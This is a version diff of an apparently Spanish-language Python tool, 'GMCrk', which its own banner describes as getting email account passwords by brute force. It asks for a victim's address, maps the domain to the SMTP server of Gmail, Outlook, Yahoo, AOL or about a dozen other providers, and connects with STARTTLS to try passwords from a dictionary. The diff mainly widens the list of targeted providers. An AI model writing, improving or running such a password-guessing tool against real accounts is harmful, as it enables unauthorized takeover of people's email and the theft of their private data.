@@ -21,62 +21,69 @@ os.system('cls')
 
 
 autor = "By: LawlietJH"
-version = "v_1.0.5"
+version = "v_1.0.6"
 
 #GMCrk - Banner Random
 banner = str(Banner()+"\n\n\t [-] Obten Contraseñas de Cuentas de Correos Por Fuerza Bruta [-] \n")
 print (banner)
 
+print(
+"""    Servidores De Correos Soportados En Este Script:
+                                                                        
+    [*] gmail.com       [*] hotmail.com     [*] mail.com        [*] yahoo.com
+    [*] ymail.com       [*] roketmail.com   [*] gmx.es          [*] zoho.com
+    [*] aol.com         [*] fastmail.com    [*] hushmail.com    [*] live.com
+    [*] inbox.com       [*] housemusic.com  [*] rediffmail.com  [*] web.de
+    [*] verizon.net     [*] comcast.net     [*] upla.cl         [*] udec.cl
+     +  Proximamente...
+     
+""")
+
 def Correo():
 	
-	global sufijo
+	global nombSMTP
 	global Usuario
 	
-	Usuario = input("\n\n [+] Dirección de Correo de la Víctima: ")
-
-	# Ejemplos de uso para endswitch: 
-	# X.lower().endswith(('.png', '.jpg', '.jpeg')) 
-	# Con esto busca si tiene alguna de esas extensiones la variable X.
-	# Esto es útil si puede haber mas de una extension posible.
-	# Se suple más fácil cuando solo se quiere validar una sola extensión .
-	# Ejemplo: if '.txt' in X: El problema de esto es que eso lo puede tomar como
-	# valido aunque se encontrara como en xt.txtxt esto no deberia ser valido :v
-	# pero lo tomaria como valido.
+	Usuario = input("\n\n [+] Dirección de Correo de la Victima: ")
 	
 	if Usuario.lower().endswith('@gmail.com'):
-		sufijo = "gmail.com"
+		nombSMTP = "smtp.gmail.com"
 	elif Usuario.lower().endswith('@hotmail.com'):
-		sufijo = "outlook.com"
+		nombSMTP = "smtp.outlook.com"
 	elif Usuario.lower().endswith('@zoho.com'):
-		sufijo = "zoho.com"
-	elif Usuario.lower().endswith('@yahoo.com'):
-		sufijo = "mail.yahoo.com"
-	elif Usuario.lower().endswith('@ymail.com'):
-		sufijo = "mail.yahoo.com"
-	elif Usuario.lower().endswith('@roketmail.com'):
-		sufijo = "mail.yahoo.com"
+		nombSMTP = "smtp.zoho.com"
 	elif Usuario.lower().endswith('@gmx.es'):
-		sufijo = "gmx.es"
+		nombSMTP = "smtp.gmx.es"
 	elif Usuario.lower().endswith('@live.com'):
-		sufijo = "live.com"
+		nombSMTP = "smtp.live.com"
+	elif Usuario.lower().endswith('@mail.com'):
+		nombSMTP = "smtp.mail.com"
 	elif Usuario.lower().endswith('@aol.com'):
-		sufijo = "aol.com"
+		nombSMTP = "smtp.aol.com"
+	elif Usuario.lower().endswith('@fastmail.com'):
+		nombSMTP = "smtp.fastmail.com"
+	elif Usuario.lower().endswith('@hushmail.com'):
+		nombSMTP = "smtp.hushmail.com"
+	elif Usuario.lower().endswith('@inbox.com'):
+		nombSMTP = "smtp.inbox.com"
+	elif Usuario.lower().endswith(('@yahoo.com', '@roketmail.com', '@ymail.com')):
+		nombSMTP = "smtp.mail.yahoo.com"
 	elif Usuario.lower().endswith('@housemusic.com'):
-		sufijo = "housemusic.com"
+		nombSMTP = "smtp.housemusic.com"
 	elif Usuario.lower().endswith('@rediffmail.com'):
-		sufijo = "rediffmail.com"
+		nombSMTP = "smtp.rediffmail.com"
 	elif Usuario.lower().endswith('@comcast.net'):
-		sufijo = "comcast.net"
+		nombSMTP = "smtp.comcast.net"
 	elif Usuario.lower().endswith('@web.de'):
-		sufijo = "web.de"
+		nombSMTP = "smtp.web.de"
 	elif Usuario.lower().endswith('@verizon.net'):
-		sufijo = "verizon.net"
+		nombSMTP = "smtp.verizon.net"
 	elif Usuario.lower().endswith('@upla.cl'):
-		sufijo = "upla.cl"
+		nombSMTP = "smtp.upla.cl"
 	elif Usuario.lower().endswith('@udec.cl'):
-		sufijo = "udec.cl"
+		nombSMTP = "smtp.udec.cl"
 	else:
-		print("\n\t\t [!] Correo No Valido.")
+		print("\n\t\t [!] Correo No Válido.")
 		os.system('Timeout /nobreak 02 > Nul')
 		exit(0)
 	
@@ -143,7 +150,7 @@ def Conexion():
 	global Usuario
 	
 	#SMTP Puerto 587/TCP (Para Clientes de Correo). Otros SMTP: 25 y 645.
-	smtpserver = smtplib.SMTP("smtp."+str(sufijo), 587)
+	smtpserver = smtplib.SMTP(str(nombSMTP), 587)
 	smtpserver.ehlo()
 	smtpserver.starttls()
 
@@ -178,9 +185,9 @@ def Conexion():
 
 def main():
 	
-	print(time.strftime("\n\n\t [!] Iniciado: %d/%m/%Y %H:%M:%S"))
 	Correo()
 	Diccionario()
+	print(time.strftime("\t [!] Iniciado: %d/%m/%Y %H:%M:%S"))
 	Conexion()
 	
 	print ("\n\n\n\t\t [*] Vuelve a intentarlo...\n\n")
